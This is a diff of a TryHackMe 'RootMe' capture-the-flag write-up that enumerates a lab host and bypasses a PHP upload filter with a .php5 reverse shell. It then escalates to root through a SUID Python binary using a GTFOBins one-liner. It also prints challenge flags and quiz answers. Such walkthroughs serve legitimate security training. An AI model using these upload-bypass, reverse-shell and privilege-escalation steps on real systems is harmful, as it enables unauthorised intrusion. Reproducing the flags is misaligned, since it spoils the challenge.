@@ -1,4 +1,14 @@
+**Tristan Gomez**
 
+# RootMe
+
+### Description
+
+`A ctf for beginners, can you root me?`
+
+### Reconnaissance 
+
+I'm going to do my usual opening for these types of challenges. I will run a SYN scan in nmap to see what ports are open.
 
 ```
 ┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
@@ -15,19 +25,10 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 5.90 seconds
 
 ```
-Scan the machine, how many ports are open?
-2
+**Question 1: Scan the machine, how many ports are open?**
+* There are two ports open, 22 and 80.
 
-
-```
-/uploads
-Apache/2.4.29 (Ubuntu) Server at 10.10.0.131 Port 80
-```
-What version of Apache is running?
-2.4.29
-
-What service is running on port 22?
-ssh
+My next step will be to use `gobuster` to see what pages exist for the website.
 
 ```
 /uploads              (Status: 301) [Size: 312] [--> http://10.10.0.131/uploads/]
@@ -35,13 +36,25 @@ ssh
 /js                   (Status: 301) [Size: 307] [--> http://10.10.0.131/js/]     
 /panel                (Status: 301) [Size: 310] [--> http://10.10.0.131/panel/] 
 ```
-What is the hidden directory?
-/panel/
+
+After finding the above pages, I decided to navigate to `/uploads`. There I found the version
+of Apache being used.
+
+**Question 2: What version of Apache is running?**
+* `Apache/2.4.29 (Ubuntu) Server at 10.10.0.131 Port 80`
+
+**Question 3: What service is running on port 22?**
+* ssh
 
 
+**Question 3: What is the hidden directory?**
+* `/panel/`
 
+### Getting a shell
+* `Find a form to upload and get a reverse shell, and find the flag.`
 
-
+I navigated to the `/panel` page, which is a file upload page. It seems as though we can abuse this functionality to get
+a reverse shell. I attempted to upload a bash script to get a reverse shell to no avail. I looked in my `/usr/share/webshells` folder to see what came with my `kali` installation. I found a `php-reverse-shell.php` scipt/file. I attempted to upload it to the page, but was greeted with a warning.
 ```
 <!DOCTYPE html>
 <html lang="en">
@@ -68,6 +81,13 @@ What is the hidden directory?
 
 ```
 
+Darn, I can't upload `.php` files....or can I? There are oh so mamy `.ph????` extensions. Let's try a different one.
+I went with `.php5`, but others should work as well. <br />
+
+Before I uploaded the file, I ran `netcat` on my machine so that I can actually use the reverse shell.
+When I upload the `.php5` file, I get a success message. No sign of a shell though...hmm. Ah, if we go back to the 
+`/uploads` page, we can see our file. If we attempt to open it, the `.php5` file is executed and I get 
+
 ```
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::1111
@@ -80,34 +100,108 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 ```
-`python -c ‘import pty;pty.spawn(“/bin/bash”)’`
 
-find / -type f -name user.txt
+*I'm in* <br />
 
-`/var/www/user.txt
-`
+For this part of the challenge, we need to find the flag which is in `user.txt`. I am going to run
+`find -type f -name user.txt`. We get back
 
 ```
-$ cat user.txt
+...
+find: './proc/915/task/915/ns': Permission denied
+find: './proc/915/fd': Permission denied
+find: './proc/915/map_files': Permission denied
+find: './proc/915/fdinfo': Permission denied
+find: './proc/915/ns': Permission denied
+find: './proc/1261/task/1261/fd': Permission denied
+find: './proc/1261/task/1261/fdinfo': Permission denied
+find: './proc/1261/task/1261/ns': Permission denied
+find: './proc/1261/fd': Permission denied
+find: './proc/1261/map_files': Permission denied
+find: './proc/1261/fdinfo': Permission denied
+find: './proc/1261/ns': Permission denied
+./var/www/user.txt
+find: './var/spool/rsyslog': Permission denied
+find: './var/spool/cron/atjobs': Permission denied
+find: './var/spool/cron/crontabs': Permission denied
+find: './var/spool/cron/atspool': Permission denied
+find: './var/log/apache2': Permission denied
+...
+```
+
+Lots of `Permission denied` but conspicuously we see our target and we can directly access it.
+```
+$ cat /var/www/user.txt
 THM{y0u_g0t_a_sh3ll}
 ```
 
+### Privilege escalation 
+* `Now that we have a shell, let's escalate our privileges to root.`
+
+
+For this next question we need to find files with `set user id` permissions (`4000`). I ran
+`find -perm /4000` and got
+
 ```
-find / -user root -perm /4000
+...
+find: './etc/ssl/private': Permission denied
+find: './etc/polkit-1/localauthority': Permission denied
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/snapd/snap-confine
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/bin/traceroute6.iputils
+./usr/bin/newuidmap
+./usr/bin/newgidmap
+./usr/bin/chsh
+./usr/bin/python
+./usr/bin/at
+./usr/bin/chfn
+./usr/bin/gpasswd
+./usr/bin/sudo
+./usr/bin/newgrp
+./usr/bin/passwd
+./usr/bin/pkexec
+find: './proc/tty/driver': Permission denied
+find: './proc/1/task/1/fd': Permission denied
+find: './proc/1/task/1/fdinfo': Permission denied
+find: './proc/1/task/1/ns': Permission denied
+...
 ```
 
-`/usr/bin/python`
+Again, lots of `Permission denied` messages, but something stand out here.
+
+**Question 4: Search for files with SUID permission, which file is weird?**
+* `/usr/bin/python`
+
+
+Taking a bit of a deeper look at python
 ```
-ls -l python
+ls -l /usr/bin/python
 -rwsr-sr-x 1 root root 3665768 Aug  4  2020 python
 
 ```
+
+Looks like we can execute python, but I'm not sure how to leverage this for my gain.
+I needed to consult the hint `Search for gtfobins`. On `https://gtfobins.github.io/`, I found what I was looking for.
+The below command, leverages Python to get us `root` privileges. 
 
 ```
 python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
 
-https://gtfobins.github.io/gtfobins/python/#suid
+Running a quit `whoami` after running python yields
+
+```
+$ python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+whoami
+root
+```
+
+Woo! Now all thats left is to find the last flag. I decided to `cd` into `/root` and ran `ls`. 
+Looks like only one file is there. Let's cat it and finish this up.
 
 ```
 cat root.txt
